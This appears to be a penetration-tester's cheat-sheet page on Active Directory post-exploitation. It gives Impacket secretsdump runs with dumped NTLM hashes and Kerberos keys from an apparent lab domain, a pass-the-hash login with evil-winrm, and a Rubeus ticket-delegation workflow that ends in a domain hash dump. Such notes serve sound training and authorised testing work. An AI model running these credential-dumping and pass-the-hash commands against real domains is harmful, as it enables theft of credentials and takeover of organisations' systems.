# Post-Exploitation



## Impacket-secretsdump

> We can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that a user account (that is synced with the domain controller) has to offer

```
impacket-secretsdump backup@spookysec.local

Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
.
.
.
.
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
```

This command dumps SAM hashes using the the Administrator's hash as a PTH method rather than entering a password

```
impacket-secretsdump Administrator@10.11.1.123 -hashes '3fee04b01f59a1001a366a7681e95699:3fee04b01f59a1001a366a7681e95699'
```

## Pass-The-Hash

### Evil-WinRM

> method of attack could allow us to authenticate as the user without the password

```
evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

## Rubeus

{% code overflow="wrap" %}
```bash
# gets tgt of machine account
.\Rubeus.exe tgtdeleg /nowrap
# decode it to .kirbi file
cat b64hash | base64 -d > m.kirbi
# convert ticket to ccache file
impacket-ticketconverter m.kirbi m.ccache
export KRB5CCNAME=`pwd`/m.ccache
klist
# syncronize time just in case
sudo ntpdate -u IP
# dump hashes
impacket-secretsdump domain.local/DC-NAME\$@dc-name.domain.local -dc-ip domain.local -no-pass -k
```
{% endcode %}
